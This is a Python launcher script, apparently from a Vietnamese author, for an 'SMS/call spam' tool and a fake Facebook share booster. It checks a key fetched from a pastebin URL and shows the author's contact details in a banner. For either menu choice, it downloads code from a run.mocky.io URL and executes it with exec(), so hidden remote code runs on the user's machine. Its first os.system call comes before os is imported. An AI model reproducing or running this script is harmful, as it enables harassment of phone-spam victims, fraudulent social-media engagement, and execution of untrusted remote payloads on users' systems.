try:
	os.system('pip install requests && pip install bs4 && pip install pystyle && pip install pathlib && pip install colorama && pip install inquirer && pip install prettytable')
except:
	pass
import os
import json
import threading
from time import sleep
import sys
import uuid
import random
import socket
import requests
from pystyle import *
key = (requests.get("https://pastebin.com/raw/xSWKZxu0").text)
def login():
    while True:
        banner()
        check_key=input(sr+"Nhập Key: ")
        if check_key == key:
            break
        print(sr+"Vui lòng liên hệ Admin để lấy key")
        sleep(1)
def banner():
        os.system("cls" if os.name == "nt" else "clear")
        banner = '''\n
    ╔════════════════════════════════════════════════════════════════════════════════════╗
    ║   ██   ██ ██   ██  █████  ███    ██  ██████   ║   ➽ Facebook : Nguyễn Văn Khang    ║ 
    ║   ██  ██  ██   ██ ██   ██ ████   ██ ██        ║   ➽ Zalo : 0988655794              ║
    ║   █████   ███████ ███████ ██ ██  ██ ██   ███  ║   ➽ Youtube : Shisui0711           ║
    ║   ██  ██  ██   ██ ██   ██ ██  ██ ██ ██    ██  ║   ➽ Bản Quyền : Shisui0711         ║
    ║   ██   ██ ██   ██ ██   ██ ██   ████  ██████   ║                                    ║
    ╚════════════════════════════════════════════════════════════════════════════════════╝                                                                                             
                               \n\n'''
        print(Colorate.Vertical(Colors.DynamicMIX((Col.light_green, Col.light_blue)), Center.XCenter(banner)))
def dk():
   a= "\033[1;91m=\033[1;97m="*30
   for i in range(len(a)):
     sys.stdout.write(a[i])
     sys.stdout.flush()
     sleep(0.001)
   print()
def delay(dl):
  try:
    for i in range(dl, -1, -1):
       print(sr+'Chờ '+r+' '+str(i)+' Giây [-]          ',end='\r')
       sleep(0.2)
       print(sr+'Chờ '+r+' '+str(i)+' Giây [\]          ',end='\r')
       sleep(0.2)
       print(sr+'Chờ '+r+' '+str(i)+' Giây [|]          ',end='\r')
       sleep(0.2)
       print(sr+'Chờ '+r+' '+str(i)+' Giây [/]          ',end='\r')
       sleep(0.2)
       print(sr+'Chờ '+r+' '+str(i)+' Giây [🔥]          ',end='\r')
       sleep(0.2)
  except:
     sleep(dl)
     print(dl,end='\r')
s = "\033[1;91m『\033[1;97m亗\033[1;91m』"
r = "\033[1;97m▶▶\033[1;92m"
sr = s+r+" "
def ra(a):
   for i in range(len(a)):
     sys.stdout.write(a[i])
     sys.stdout.flush()
     sleep(0.001)
   print()
login()
banner()
dk()
print(sr+"Nhập [1] Tool Spam Sms,Call]")
print(sr+"Nhập [2] Tool Buff Share Ảo Facebook")
print()
dk()
choose = int(input(sr+"Nhập Số : "))
try:
    if choose == 1:
        exec(requests.get("https://run.mocky.io/v3/a9c4213d-548b-482c-9753-e71b2ef07dc7").text)
    if choose == 2:
        exec(requests.get("https://run.mocky.io/v3/d6693789-6b2e-4a49-b46b-be83c4de2942").text)
except:
    pass
